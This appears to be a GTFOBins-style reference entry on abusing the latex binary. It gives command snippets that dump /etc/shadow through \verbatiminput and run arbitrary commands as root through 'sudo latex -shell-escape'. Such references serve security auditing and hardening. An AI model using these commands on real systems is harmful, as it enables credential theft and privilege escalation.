description: `latex` is a symbolic link to [`pdftex`](/gtfobins/pdftex/). However the program does not have the same behaviour regarding the name of argv[0]. This is the same behaviour for [`xetex`](/gtfobins/xetex/)/[`xelatex`](/gtfobins/xelatex/).
functions:
  file-read:
    - code: |
        echo "\documentclass[12pt]{article} \usepackage{verbatim} \begin{document} \verbatiminput{/etc/shadow} \end{document}" > read.tex
        latex read.tex
        strings read.dvi
  sudo:
    - code: |
        echo "\documentclass[12pt]{article} \begin{document} \immediate\write18{/usr/bin/whoami} \end{document}" > file.tex
        sudo latex -shell-escape file.tex
